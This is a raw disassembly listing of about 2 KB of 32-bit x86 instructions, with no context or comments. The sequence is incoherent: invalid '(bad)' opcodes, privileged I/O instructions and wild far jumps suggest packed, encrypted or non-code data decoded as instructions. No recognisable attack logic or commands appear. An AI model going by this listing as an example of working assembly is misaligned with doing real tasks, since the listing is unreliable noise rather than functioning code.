  4087f3:	sahf   
  4087f4:	push   es
  4087f5:	stos   BYTE PTR es:[edi],al
  4087f6:	add    eax,0x8498d14c
  4087fb:	fdiv   QWORD PTR [ebx+0x7f097e34]
  408801:	mov    cl,0x9c
  408803:	icebp  
  408804:	push   eax
  408805:	push   ebx
  408806:	nop
  408807:	jmp    0xbcd70efb
  40880c:	lock (bad) 
  40880e:	cmp    cl,BYTE PTR ds:0xaf117225
  408814:	mov    edi,0x308513be
  408819:	sbb    al,0x10
  40881b:	jne    0x4087dc
  40881d:	adc    BYTE PTR [edx+0x2d3dc8ac],dl
  408823:	xor    bl,0x88
  408826:	sub    DWORD PTR [esi+0x6e7ae2fd],edi
  40882c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40882d:	sbb    DWORD PTR [esi],ebx
  40882f:	sbb    DWORD PTR [ecx],ebx
  408831:	call   0x42728a06
  408836:	mul    BYTE PTR [ebp+ebp*1-0x22]
  40883a:	fucompp 
  40883c:	pop    ebp
  40883d:	in     al,0xca
  40883f:	and    edi,0x58550d5e
  408845:	test   edx,ecx
  408847:	jl     0x408825
  408849:	jno    0x4087cf
  40884b:	pop    esi
  40884c:	mov    cl,0x6f
  40884e:	dec    ebp
  40884f:	xchg   edx,edx
  408851:	sbb    BYTE PTR [ebp+edi*1+0x4],dh
  408855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408857:	mov    edx,DWORD PTR [edi+0xe4a85fe]
  40885d:	cwde   
  40885e:	dec    eax
  40885f:	daa    
  408860:	retf   
  408861:	in     al,0x98
  408863:	pop    eax
  408864:	mov    dl,0xed
  408866:	addr16 mov eax,0x6b00ccd9
  40886c:	int3   
  40886d:	mov    bl,0x7e
  40886f:	shr    ecx,0x5e
  408872:	mov    bh,0x96
  408874:	scas   eax,DWORD PTR es:[edi]
  408875:	mov    al,0x70
  408877:	mov    ch,0xec
  408879:	or     ch,BYTE PTR [bx]
  40887c:	push   edi
  40887d:	xor    al,0x5b
  40887f:	ficom  DWORD PTR [ebx]
  408881:	fild   WORD PTR [edx]
  408883:	push   esi
  408884:	mov    ch,0x4
  408886:	xchg   ecx,eax
  408887:	jg     0x4088d3
  408889:	test   BYTE PTR [ebp+0x23e27b6e],ah
  40888f:	jp     0x4088f6
  408891:	jmp    0xac0:0x83ceb8e2
  408898:	mov    cl,0xaf
  40889a:	or     eax,0x4ead5b1
  40889f:	(bad)  
  4088a0:	sub    bh,cl
  4088a2:	jmp    0x4b4a:0x7b1a0e56
  4088a9:	lds    edx,FWORD PTR [ebp+0x50]
  4088ac:	inc    ebp
  4088ad:	push   es
  4088ae:	bound  ebp,QWORD PTR [ebp+0x53]
  4088b1:	jge    0x40888d
  4088b3:	or     esi,edi
  4088b5:	test   al,0x75
  4088b7:	sub    al,0x1e
  4088b9:	xlat   BYTE PTR ds:[ebx]
  4088ba:	or     eax,0x168420d1
  4088bf:	cdq    
  4088c0:	adc    BYTE PTR ds:0x77d1b345,bl
  4088c6:	into   
  4088c7:	push   esp
  4088c8:	push   edx
  4088c9:	mov    DWORD PTR [ecx],0x11f26c18
  4088cf:	xchg   ebp,esi
  4088d1:	sub    eax,0x9566caa9
  4088d6:	sub    eax,0xd2cdbed2
  4088db:	xor    eax,0x69bb3751
  4088e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088e1:	jg     0x4088a1
  4088e3:	sub    BYTE PTR [edx-0x3fbd9cf6],0xa2
  4088ea:	aad    0x19
  4088ec:	mov    esi,0xb7fcfab5
  4088f1:	std    
  4088f2:	or     DWORD PTR [ecx],edi
  4088f4:	loop   0x4088a5
  4088f6:	fnsave [ebx-0x62f93e6a]
  4088fc:	push   ss
  4088fd:	scas   al,BYTE PTR es:[edi]
  4088fe:	inc    eax
  4088ff:	pop    ebp
  408900:	cmp    eax,0x86f65abd
  408905:	(bad)  
  408906:	or     ebx,edx
  408908:	ss inc ecx
  40890a:	mov    cl,0x96
  40890c:	push   0x2a
  40890e:	xor    eax,0x61dce702
  408913:	rcl    ebx,1
  408915:	int3   
  408916:	(bad)  
  408917:	loope  0x40890c
  408919:	add    ecx,0xb328ef18
  40891f:	inc    edx
  408920:	fwait
  408921:	sbb    ch,BYTE PTR [eax+0x1d]
  408924:	cmp    bl,BYTE PTR [ebp-0x72]
  408927:	lea    ebx,[ecx]
  408929:	pop    ecx
  40892a:	rcr    DWORD PTR [ecx],cl
  40892c:	call   0xc5295bd3
  408931:	adc    edx,DWORD PTR [eax+0x39]
  408934:	out    0x8d,al
  408936:	outs   dx,BYTE PTR ds:[esi]
  408937:	ds sahf 
  408939:	nop
  40893a:	inc    ebx
  40893b:	mov    gs,WORD PTR ds:0x79d4f8c3
  408941:	inc    ecx
  408942:	cmc    
  408943:	sahf   
  408944:	sti    
  408945:	icebp  
  408946:	adc    al,0xc6
  408948:	push   cs
  408949:	sub    esi,esi
  40894b:	iret   
  40894c:	pushf  
  40894d:	push   esi
  40894e:	loop   0x408997
  408950:	cmp    eax,0x824ea7ed
  408955:	fst    DWORD PTR [ebx]
  408957:	jecxz  0x4089c8
  408959:	mov    bl,0xdf
  40895b:	xor    BYTE PTR [eax+0x4d],bh
  40895e:	test   DWORD PTR [eax+0x26],edi
  408961:	pop    ds
  408962:	push   eax
  408963:	sbb    dl,BYTE PTR [edi+eax*2]
  408966:	or     al,0x16
  408968:	mov    ebp,ecx
  40896a:	push   ebp
  40896b:	fdivr  QWORD PTR [ecx]
  40896d:	mov    dh,dh
  40896f:	test   eax,0xdc742398
  408974:	push   edx
  408975:	jmp    0x97da08c2
  40897a:	inc    ebx
  40897b:	sub    al,0xc7
  40897d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40897e:	bsr    esi,DWORD PTR [ebp-0x1419fe5a]
  408985:	push   ecx
  408986:	dec    esi
  408987:	pop    esp
  408988:	sbb    DWORD PTR [esi],esi
  40898a:	repz push 0xc1d17a5e
  408990:	stc    
  408991:	mov    ss,WORD PTR [edi]
  408993:	adc    BYTE PTR [eax-0x7e4dafbc],ch
  408999:	sub    eax,0x34900b8e
  40899e:	cmp    eax,0x18f67b5a
  4089a3:	mov    edx,0x72efec7a
  4089a8:	stos   BYTE PTR es:[edi],al
  4089a9:	clc    
  4089aa:	sub    DWORD PTR [ecx],0xf4c4edf9
  4089b0:	cwde   
  4089b1:	mov    ebp,0x18c22df3
  4089b6:	mov    eax,DWORD PTR [edi]
  4089b8:	into   
  4089b9:	test   eax,0xccb1b1ee
  4089be:	nop
  4089bf:	dec    esi
  4089c0:	loopne 0x4089a7
  4089c2:	test   DWORD PTR [eax+0x72878431],ebp
  4089c8:	(bad)  
  4089ca:	or     edi,eax
  4089cc:	and    BYTE PTR [esi],cl
  4089ce:	int3   
  4089cf:	into   
  4089d0:	push   es
  4089d1:	jae    0x408a48
  4089d3:	popf   
  4089d4:	mov    edi,0xea2a31a0
  4089d9:	arpl   bx,si
  4089db:	addr16 int3 
  4089dd:	xor    BYTE PTR [edi+0x4802071c],dl
  4089e3:	into   
  4089e4:	stc    
  4089e5:	push   es
  4089e6:	pop    ecx
  4089e7:	or     al,0xcd
  4089e9:	push   ds
  4089ea:	xchg   DWORD PTR [edx-0xe],edi
  4089ed:	jno    0x408a6b
  4089ef:	test   dh,ch
  4089f1:	call   0x352a:0xc6293ad1
  4089f8:	les    ebp,FWORD PTR [ebx-0x372017c1]
  4089fe:	pop    eax
  4089ff:	mov    dh,0xf
  408a01:	cwde   
  408a02:	jne    0x408a0e
  408a04:	bound  esi,QWORD PTR [ebx]
  408a06:	mov    ebx,0xfb8d84a8
  408a0b:	sti    
  408a0c:	mov    ?,WORD PTR [esi+0x4f10013]
  408a12:	ds push es
  408a14:	sti    
  408a15:	push   esp
  408a16:	mov    dl,0xb3
  408a18:	or     al,0x97
  408a1a:	sti    
  408a1b:	pop    ecx
  408a1c:	sbb    al,0x75
  408a1e:	cdq    
  408a1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a20:	pushf  
  408a21:	enter  0xd217,0x63
  408a25:	daa    
  408a26:	jne    0x408a25
  408a28:	push   edi
  408a29:	jbe    0x4089de
  408a2b:	pushf  
  408a2c:	push   0x110c6d4a
  408a31:	sbb    BYTE PTR [edx+ebx*2-0x1d01107d],0x17
  408a39:	imul   ebp,DWORD PTR [esi+0x77],0x6f756356
  408a40:	lds    edi,FWORD PTR [edi]
  408a42:	pop    ebp
  408a43:	cmp    BYTE PTR [edx],ah
  408a45:	push   cs
  408a46:	nop
  408a47:	ds dec edi
  408a49:	mov    esi,0x6b79d412
  408a4e:	bound  eax,QWORD PTR [edi-0x3f]
  408a51:	mov    esi,0x4ff96fc6
  408a56:	pop    eax
  408a57:	fiadd  DWORD PTR [esi+0x1e]
  408a5a:	push   edx
  408a5b:	and    al,0x5c
  408a5d:	ss jno 0x408a65
  408a60:	lea    edi,[edi+0x51078658]
  408a66:	push   edx
  408a67:	repz ret 0x3f88
  408a6b:	sti    
  408a6c:	shl    ebx,cl
  408a6e:	popaw  
  408a70:	cdq    
  408a71:	leave  
  408a72:	pop    edx
  408a73:	out    dx,al
  408a74:	xchg   ebp,eax
  408a75:	std    
  408a76:	xchg   ebp,eax
  408a77:	test   al,0x40
  408a79:	gs out 0xd2,eax
  408a7c:	not    esi
  408a7e:	sub    BYTE PTR [ecx+eiz*2-0x5d],bh
  408a82:	fstp   TBYTE PTR [ebx]
  408a84:	out    0x9e,eax
  408a86:	mov    edx,esi
  408a88:	fimul  WORD PTR [ebx+0x42]
  408a8b:	pop    eax
  408a8c:	jge    0x408a42
  408a8e:	fst    QWORD PTR [ebp*2+0x7072a9c6]
  408a95:	out    0x6e,eax
  408a97:	inc    ebx
  408a98:	out    0x8f,al
  408a9a:	jnp    0x408abe
  408a9c:	or     al,BYTE PTR [edi-0x53f3c707]
  408aa2:	xor    DWORD PTR [esi],ebp
  408aa4:	push   eax
  408aa5:	mov    esp,0x33338e26
  408aaa:	jbe    0x408aa6
  408aac:	inc    edi
  408aad:	aas    
  408aae:	push   cs
  408aaf:	fbld   TBYTE PTR [ecx-0x11]
  408ab2:	push   ebp
  408ab3:	push   esp
  408ab4:	jae    0x408a70
  408ab6:	mov    al,0xbd
  408ab8:	mov    ecx,0xfd60b8af
  408abd:	repz js 0x408a6c
  408ac0:	mov    ds:0xf776673b,eax
  408ac5:	sbb    edx,DWORD PTR [edi-0x7f3858e0]
  408acb:	mov    ebx,0xc78fdc98
  408ad0:	fnsave ds:0x86f6c15
  408ad6:	xor    ebx,ebx
  408ad8:	fadd   QWORD PTR [ecx+eax*8+0x3036c11b]
  408adf:	pop    eax
  408ae0:	xchg   ebx,eax
  408ae1:	inc    edi
  408ae2:	frstor [edx-0x77f3c3ab]
  408ae8:	retf   0x379f
  408aeb:	bound  ecx,QWORD PTR [ebx-0x6a]
  408aee:	sub    al,0x2c
  408af0:	popf   
  408af1:	fsub   st,st(0)
  408af3:	sub    al,0x64
  408af5:	adc    DWORD PTR [ebx+0x69504e97],ebx
  408afb:	adc    eax,ebx
  408afd:	(bad)  
  408aff:	sbb    eax,0x146388a6
  408b04:	in     eax,dx
  408b05:	hlt    
  408b06:	push   ebx
  408b07:	rol    BYTE PTR [ebp+0x1f3f4d91],0xcc
  408b0e:	cmp    bl,BYTE PTR [ecx+0x262f1e25]
  408b14:	dec    ebx
  408b15:	mov    al,0x4b
  408b17:	sub    edi,DWORD PTR [esi+0x2b97828d]
  408b1d:	jg     0x408b74
  408b1f:	ret    
  408b20:	and    al,0x8e
  408b22:	cld    
  408b23:	(bad)  
  408b25:	test   BYTE PTR [edx-0x69978cae],dl
  408b2b:	scas   eax,DWORD PTR es:[edi]
  408b2c:	jbe    0x408b3b
  408b2e:	mov    al,ds:0x438d21bd
  408b33:	mov    eax,0x4080ddd6
  408b38:	jmp    0x408b56
  408b3a:	rcl    BYTE PTR [ebp-0x43b2f706],0xb0
  408b41:	push   0x22
  408b43:	in     al,0x25
  408b45:	fidiv  WORD PTR [ebx+ebx*4+0xb]
  408b49:	cmp    al,0xef
  408b4b:	dec    esi
  408b4c:	cmp    edx,DWORD PTR [ecx-0x1c]
  408b4f:	bnd jns 0x408ae6
  408b52:	or     eax,0x35ac560a
  408b57:	push   ss
  408b58:	jecxz  0x408b42
  408b5a:	into   
  408b5b:	loope  0x408b34
  408b5d:	inc    edx
  408b5e:	jne    0x408b45
  408b60:	pop    es
  408b61:	pop    edi
  408b62:	test   esp,esp
  408b64:	int    0x7a
  408b66:	pop    es
  408b67:	fmul   QWORD PTR [edi-0x1a]
  408b6a:	fcmovnu st,st(3)
  408b6c:	outs   dx,DWORD PTR ds:[esi]
  408b6d:	adc    bl,bh
  408b6f:	jns    0x408bbe
  408b71:	ins    DWORD PTR es:[edi],dx
  408b72:	retf   0xe7ac
  408b75:	xchg   ch,al
  408b77:	and    DWORD PTR [eax-0x24d9b022],edx
  408b7d:	xchg   ah,cl
  408b7f:	lods   al,BYTE PTR ds:[esi]
  408b80:	sub    eax,0xfdb93fae
  408b85:	or     al,0x1a
  408b87:	loop   0x408b4f
  408b89:	xor    DWORD PTR [esi+edi*1-0x39],edi
  408b8d:	arpl   WORD PTR [ecx+0x52],si
  408b90:	or     DWORD PTR [edi+ebp*4+0xd],0xffffffed
  408b95:	fwait
  408b96:	or     BYTE PTR [ecx-0x2a],ch
  408b99:	inc    eax
  408b9a:	bound  ebp,QWORD PTR cs:[edi+0x1c]
  408b9e:	mov    al,ds:0xdc97424f
  408ba3:	mov    ebx,0xf37fec0e
  408ba8:	mov    ebx,0x81f2b0af
  408bad:	stc    
  408bae:	jmp    0x408c14
  408bb0:	pop    edi
  408bb1:	in     eax,0xc4
  408bb3:	into   
  408bb4:	jmp    0x4fb:0xec00984c
  408bbb:	jecxz  0x408bae
  408bbd:	mov    ds:0x2898bc8e,eax
  408bc2:	sub    si,WORD PTR [ebp+0x56]
  408bc6:	test   DWORD PTR [ecx+0x15e9317b],edi
  408bcc:	jo     0x408ba9
  408bce:	iret   
  408bcf:	jns    0x408bed
  408bd1:	ror    BYTE PTR [ebp+edx*2+0x54],cl
  408bd5:	adc    DWORD PTR [edi],ebx
  408bd7:	inc    eax
  408bd8:	dec    esi
  408bd9:	std    
  408bda:	push   esi
  408bdb:	shl    edi,0xa9
  408bde:	nop
  408bdf:	imul   eax,esp,0xd
  408be2:	sub    al,0x60
  408be4:	jmp    0xe7cab39e
  408be9:	scas   al,BYTE PTR es:[edi]
  408bea:	out    dx,al
  408beb:	mov    BYTE PTR [eax-0x5da6f301],ah
  408bf1:	fisubr WORD PTR [esi+0x49]
  408bf4:	out    0x6f,eax
  408bf6:	sub    BYTE PTR [edi+ecx*2-0x4c],ah
  408bfa:	imul   eax,DWORD PTR ds:[ecx+0x697e12f6],0x62201f4a
  408c05:	push   ds
  408c06:	inc    ecx
  408c07:	jg     0x408c72
  408c09:	cmp    al,0x53
  408c0b:	fistp  QWORD PTR [eax]
  408c0d:	jmp    0x408c50
  408c0f:	(bad)  
  408c10:	sar    BYTE PTR ds:0x97322039,cl
  408c16:	or     BYTE PTR [esi+0x17e250ff],ch
  408c1c:	popw   es
  408c1e:	mov    edi,0x8bf49d6
  408c23:	push   ecx
  408c24:	imul   esp,eax,0x7c
  408c27:	popf   
  408c28:	fnstsw WORD PTR [edx]
  408c2a:	xchg   esi,eax
  408c2b:	and    al,BYTE PTR [eax+0x0]
  408c2e:	jns    0x408bce
  408c30:	in     eax,dx
  408c31:	or     bl,BYTE PTR [ecx]
  408c33:	sbb    DWORD PTR [ebx],ebp
  408c35:	mov    cl,0xb0
  408c37:	xchg   cl,cl
  408c39:	test   eax,0x1b366f4d
  408c3e:	adc    ah,dh
  408c40:	push   ecx
  408c41:	es mov ebx,0x678779b3
  408c47:	jg     0x408c90
  408c49:	mov    ecx,esp
  408c4b:	push   ebp
  408c4c:	fcmovnu st,st(4)
  408c4e:	sub    DWORD PTR [esi+0x77e3b736],esi
  408c54:	mov    ecx,0xf2cb78d2
  408c59:	mov    ebp,0xa772a700
  408c5e:	push   ebx
  408c5f:	mov    eax,0x48adc3bd
  408c64:	mov    ss,WORD PTR [eax-0x1c4e355d]
  408c6a:	and    eax,0x5cafbca4
  408c6f:	test   BYTE PTR [edx],bl
  408c71:	lea    ebp,[ebx-0x6032e78c]
  408c77:	dec    ebp
  408c78:	push   ss
  408c79:	retf   
  408c7a:	xchg   edx,eax
  408c7b:	jb     0x408c69
  408c7d:	das    
  408c7e:	fucom  st(7)
  408c80:	jbe    0x408c56
  408c82:	mov    ecx,0x351bf88
  408c87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c88:	lods   al,BYTE PTR ds:[esi]
  408c89:	add    eax,DWORD PTR [edi-0x55]
  408c8c:	add    cl,BYTE PTR [esi-0x63]
  408c8f:	inc    esi
  408c90:	sbb    ebx,esp
  408c92:	inc    esi
  408c93:	mov    edi,0x37843ee6
  408c98:	lods   al,BYTE PTR ds:[esi]
  408c99:	arpl   sp,ax
  408c9b:	xor    esi,esp
  408c9d:	ret    
  408c9e:	mov    ch,0xca
  408ca0:	rcl    DWORD PTR [ebp-0x7d71f6eb],cl
  408ca6:	pop    edx
  408ca7:	push   eax
  408ca8:	or     al,0xe3
  408caa:	std    
  408cab:	fxam   
  408cad:	pusha  
  408cae:	fs dec ebp
  408cb0:	jo     0x408c64
  408cb2:	ret    0x44f6
  408cb5:	out    0xa2,al
  408cb7:	inc    ebp
  408cb8:	add    BYTE PTR [edx-0x6798770b],bl
  408cbe:	adc    eax,DWORD PTR [ecx]
  408cc0:	daa    
  408cc1:	daa    
  408cc2:	inc    ebp
  408cc3:	pop    ss
  408cc4:	push   ds
  408cc5:	js     0x408c6f
  408cc7:	mov    DWORD PTR [ebp-0x2088977b],ebx
  408ccd:	fwait
  408cce:	push   cs
  408ccf:	gs mov dh,0xbc
  408cd2:	jl     0x408c70
  408cd4:	mov    ecx,0x12dab9fa
  408cd9:	neg    BYTE PTR ss:[edx]
  408cdc:	jge    0x408d36
  408cde:	popa   
  408cdf:	aam    0xf3
  408ce1:	gs cwde 
  408ce3:	or     BYTE PTR [edi+0x75811ea],0xe5
  408cea:	xchg   ecx,eax
  408ceb:	mov    bh,0xf1
  408ced:	sbb    al,0x93
  408cef:	addr16 or al,0xc6
  408cf2:	xor    eax,0xe9efd344
  408cf7:	enter  0xae12,0xfd
  408cfb:	dec    esi
  408cfc:	jo     0x408d11
  408cfe:	stos   DWORD PTR es:[edi],eax
  408cff:	jp     0x408c9b
  408d01:	inc    eax
  408d02:	inc    ebx
  408d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d04:	add    dl,dl
  408d06:	out    dx,al
  408d07:	jnp    0x408d64
  408d09:	push   0xfffffff1
  408d0b:	dec    eax
  408d0c:	and    edx,DWORD PTR [ecx]
  408d0e:	out    dx,al
  408d0f:	fisub  DWORD PTR [edx+0x5d1e0249]
  408d15:	xor    al,0x48
  408d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d18:	std    
  408d19:	test   dh,dl
  408d1b:	xchg   edi,eax
  408d1c:	xchg   DWORD PTR [ecx-0xe],ebx
  408d1f:	(bad)  
  408d20:	loop   0x408cc2
  408d22:	lods   al,BYTE PTR ds:[esi]
  408d23:	push   edi
  408d24:	js     0x408ca6
  408d26:	lds    esp,FWORD PTR [edx]
  408d28:	les    ecx,FWORD PTR [eax+0xd]
  408d2b:	cmp    eax,0x487e6aa9
  408d30:	inc    ebx
  408d31:	lds    ebx,FWORD PTR [ebx-0x52327c41]
  408d37:	scas   al,BYTE PTR es:[edi]
  408d38:	xchg   BYTE PTR [ebp+0x2513d1cc],dl
  408d3e:	and    edi,edi
  408d40:	push   ss
  408d41:	mov    ds:0x6ddbad7b,al
  408d46:	sbb    eax,0x60b73338
  408d4b:	rol    BYTE PTR [ebp-0x13966f37],0x75
  408d52:	adc    al,0xe6
  408d54:	pop    esi
  408d55:	mov    eax,ds:0x539ab0c9
  408d5a:	dec    esi
  408d5b:	xchg   esi,eax
  408d5c:	dec    esi
  408d5d:	xor    esp,DWORD PTR [ecx-0x236f333c]
  408d63:	push   ss
  408d64:	repnz lahf 
  408d66:	inc    edx
  408d67:	jg     0x408cf1
  408d69:	xchg   edx,eax
  408d6a:	and    BYTE PTR [ecx-0x125f66a1],0xf6
  408d71:	aad    0xb7
  408d73:	packsswb mm3,QWORD PTR [esi-0x66860d7f]
  408d7a:	mov    eax,DWORD PTR [edx-0x6162616]
  408d80:	xor    dl,BYTE PTR [ebx]
  408d82:	lods   al,BYTE PTR ds:[esi]
  408d83:	sbb    eax,0x4e929c8e
  408d88:	mov    BYTE PTR [eax-0x6b67e63a],bh
  408d8e:	sbb    cl,dh
  408d90:	add    dh,0xdb
  408d93:	icebp  
  408d94:	cli    
  408d95:	bound  ebp,QWORD PTR [eax]
  408d97:	mov    edi,0xb8875ac4
  408d9c:	ja     0x57d11885
  408da2:	cwde   
  408da3:	cmp    bl,BYTE PTR [ebp-0x37d07f85]
  408da9:	jecxz  0x408db7
  408dab:	dec    ecx
  408dac:	add    edi,DWORD PTR [ebp+0x2c]
  408daf:	add    ch,BYTE PTR [edi]
  408db1:	adc    al,0xb4
  408db3:	pop    eax
  408db4:	push   cs
  408db5:	and    esi,DWORD PTR [edi-0x6c]
  408db8:	fidivr DWORD PTR [ecx+0xc1fa299]
  408dbe:	push   ebp
  408dbf:	in     al,dx
  408dc0:	stos   BYTE PTR es:[edi],al
  408dc1:	mov    ah,0x2b
  408dc3:	imul   esi,DWORD PTR [ecx-0x1da4efa9],0x94e9de8a
  408dcd:	adc    DWORD PTR [edx],edi
  408dcf:	and    eax,0x1b239439
  408dd4:	xor    DWORD PTR [ebx],0x3062aaea
  408dda:	dec    esi
  408ddb:	les    edi,FWORD PTR [edi+0x73]
  408dde:	xchg   DWORD PTR [ecx-0x29f81a88],ebx
  408de4:	and    esi,DWORD PTR [edx-0x66]
  408de7:	xor    eax,0x43abe5e0
  408dec:	jns    0x408e4d
  408dee:	cdq    
  408def:	(bad)  
  408df1:	div    DWORD PTR [ecx+0x5ec2f135]
  408df7:	mov    al,ds:0x72af713
  408dfc:	jnp    0x408dc8
  408dfe:	enter  0x1e5a,0xa2
  408e02:	and    al,0x82
  408e04:	sub    eax,0x330bc613
  408e09:	adc    eax,0x46ff0d3b
  408e0e:	pop    edx
  408e0f:	push   0xffffffb0
  408e11:	fist   DWORD PTR [edi+0x38b42c41]
  408e17:	addr16 arpl bp,dx
  408e1a:	retf   
  408e1b:	shl    BYTE PTR [edi+0x13],cl
  408e1e:	das    
  408e1f:	hlt    
  408e20:	into   
  408e21:	pop    esi
  408e22:	add    DWORD PTR [eax-0x12993e36],0x6fdba3b7
  408e2c:	xchg   BYTE PTR [ebx],ch
  408e2e:	inc    ebp
  408e2f:	ins    DWORD PTR es:[edi],dx
  408e30:	cmp    BYTE PTR [edi+esi*8-0x2a],ah
  408e34:	sbb    eax,0x6d8f7a31
  408e39:	mov    ebp,0x4d08a1be
  408e3e:	inc    esi
  408e3f:	mov    ds:0xea4b285a,al
  408e44:	mov    ch,0xfa
  408e46:	aam    0xd2
  408e48:	xor    ecx,DWORD PTR [ecx]
  408e4a:	in     eax,dx
  408e4b:	sahf   
  408e4c:	or     DWORD PTR [esp+ebx*4-0x56],ebp
  408e50:	lea    ebx,[ebx+0x667b4c10]
  408e56:	out    0xef,eax
  408e58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e59:	int3   
  408e5a:	fdivrp st(2),st
  408e5c:	outs   dx,DWORD PTR ds:[esi]
  408e5d:	sbb    cl,dl
  408e5f:	add    bh,BYTE PTR [edx+0x1a]
  408e62:	sub    BYTE PTR [esi+esi*8],bh
  408e65:	sbb    DWORD PTR [eax],edi
  408e67:	jg     0x408e77
  408e69:	sbb    al,0x6
  408e6b:	jnp    0x408ed4
  408e6d:	dec    esp
  408e6e:	aas    
  408e6f:	inc    eax
  408e70:	std    
  408e71:	fld    TBYTE PTR [esi-0x56]
  408e74:	(bad)
  408e77:	push   ds
  408e78:	ins    DWORD PTR es:[edi],dx
  408e79:	test   BYTE PTR [edi],0x20
  408e7c:	adc    ecx,eax
  408e7e:	jno    0x408edf
  408e80:	mov    cl,0xb
  408e82:	mov    WORD PTR [edi+eax*8+0x5d],ss
  408e86:	push   ebp
  408e87:	and    dh,BYTE PTR [ebx-0x1e]
  408e8a:	inc    ebp
  408e8b:	mov    eax,ds:0x1d1401ae
  408e90:	push   edi
  408e91:	leave  
  408e92:	jecxz  0x408eff
  408e94:	daa    
  408e95:	adc    ah,BYTE PTR [edx]
  408e97:	jne    0x408e3d
  408e99:	mov    ebx,0x7e305cb5
  408e9e:	scas   al,BYTE PTR es:[edi]
  408e9f:	jae    0x408efb
  408ea1:	xchg   ecx,eax
  408ea2:	pop    edi
  408ea3:	(bad)  
  408ea4:	ss pop esi
  408ea7:	xchg   esi,edx
  408ea9:	xchg   BYTE PTR [ebp+0x3e],bh
  408eac:	popf   
  408ead:	sti    
  408eae:	enter  0xcfa8,0xc3
  408eb2:	xor    al,0x86
  408eb4:	popa   
  408eb5:	les    esi,FWORD PTR [ebp-0x45]
  408eb8:	stos   BYTE PTR es:[edi],al
  408eb9:	mov    eax,ds:0x55f4f131
  408ebe:	and    BYTE PTR [eax],ah
  408ec0:	shl    BYTE PTR [esi+0x43230185],0xd2
  408ec7:	(bad)  
  408ec8:	aaa    
  408ec9:	loope  0x408f18
  408ecb:	xor    eax,0xc06ba131
  408ed0:	mov    ah,0x27
  408ed2:	hlt    
  408ed3:	jno    0x408e93
  408ed5:	pop    ebx
  408ed6:	std    
  408ed7:	dec    esp
  408ed8:	cld    
  408ed9:	mov    al,ds:0xa9438d40
  408ede:	lea    esi,[ebp+0x315a2e6a]
  408ee4:	rol    BYTE PTR [eax-0x5a],cl
  408ee7:	in     eax,0x28
  408ee9:	aaa    
  408eea:	jne    0x408eaa
  408eec:	mov    ds:0x6e0321fa,al
  408ef1:	pop    eax
  408ef2:	mov    ch,0xf1
  408ef4:	xchg   BYTE PTR [eax+0x40],cl
  408ef7:	push   0xed676945
  408efc:	pop    ds
  408efd:	into   
  408efe:	xor    eax,0x7fa5c823
  408f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f04:	mov    bl,dl
  408f06:	sti    
  408f07:	mov    bh,0x39
  408f09:	inc    edi
  408f0a:	jecxz  0x408eaa
  408f0c:	ret    
  408f0d:	jmp    0x408f8b
  408f0f:	xchg   esi,eax
  408f10:	cmp    eax,0xf83b69c
  408f15:	sbb    BYTE PTR [eax+0x3d],ch
  408f18:	pop    ebp
  408f19:	(bad)  
  408f1a:	sbb    al,0x1
  408f1c:	push   eax
  408f1d:	inc    eax
  408f1e:	jo     0x408f26
  408f20:	rol    DWORD PTR [ecx+0x4a],cl
  408f23:	aad    0x5f
  408f25:	xor    ebx,DWORD PTR ds:0x9bd4d7ba
  408f2b:	adc    cl,BYTE PTR ds:0xbe78f9c
  408f31:	in     eax,dx
  408f32:	leave  
  408f33:	imul   ebx
  408f35:	fsubr  DWORD PTR ds:0x79499ccb
  408f3b:	mul    BYTE PTR [eax+0x1e]
  408f3e:	pop    esp
  408f3f:	adc    al,0x8a
  408f41:	cli    
  408f42:	xor    eax,0x55b5d0c1
  408f47:	test   ah,ah
  408f49:	aas    
  408f4a:	sbb    BYTE PTR [edi],al
  408f4c:	dec    eax
  408f4d:	repz leave 
  408f4f:	out    dx,al
  408f50:	xchg   edi,eax
  408f51:	jge    0x408f95
  408f53:	je     0x408f47
  408f55:	inc    ecx
  408f56:	shl    DWORD PTR [ebp-0x2],cl
  408f59:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f5b:	pop    ebx
  408f5c:	int3   
  408f5d:	xlat   BYTE PTR ds:[ebx]
  408f5e:	pop    ss
  408f5f:	daa    
  408f60:	int    0x9c
  408f62:	mov    dh,0x42
  408f64:	pop    es
  408f65:	jb     0x408f97
  408f67:	js     0x408fe5
  408f69:	loope  0x408fe7
  408f6b:	push   ebx
  408f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f6d:	nop
  408f6e:	idiv   BYTE PTR [edx-0xc]
  408f71:	ret    
  408f72:	lea    ecx,[ebp-0x5f]
  408f75:	xchg   esi,eax
  408f76:	and    edx,esi
  408f78:	xchg   ebx,eax
  408f79:	addr16 pop ecx
  408f7b:	popf   
  408f7c:	pop    esi
  408f7d:	test   BYTE PTR [edx+eax*8+0x4cb8ea52],dl
  408f84:	cmp    edi,esi
  408f86:	push   ebp
  408f87:	cdq    
  408f88:	popf   
  408f89:	jg     0x408f4e
  408f8b:	out    dx,eax
  408f8c:	pop    es
  408f8d:	out    0x8,eax
  408f8f:	pop    esp
  408f90:	mov    bl,0x53
  408f92:	inc    eax
  408f93:	(bad)  
  408f94:	and    al,0x2
  408f96:	test   eax,0x49dabb63
  408f9b:	dec    esp
  408f9c:	lock lock mov ah,0x42
  408fa0:	mov    cl,0x92
  408fa2:	jge    0x408fdd
  408fa4:	int3   
  408fa5:	jge    0x408faf
  408fa7:	cmp    al,dh
  408fa9:	add    eax,0xa726225e
  408fae:	(bad)  [edx-0x19]
  408fb1:	dec    esi
  408fb2:	mov    bh,0x8b
  408fb4:	into   
  408fb5:	pushf  
  408fb6:	cmc    
  408fb7:	mov    esp,0x51a38049
  408fbc:	mov    fs,ebp
  408fbe:	(bad)  
  408fc0:	xchg   esi,eax
  408fc1:	sub    DWORD PTR [eax-0x3efaeac1],edx
  408fc7:	mov    dh,0x8a
  408fc9:	jl     0x408fc4
  408fcb:	retf   
  408fcc:	into   
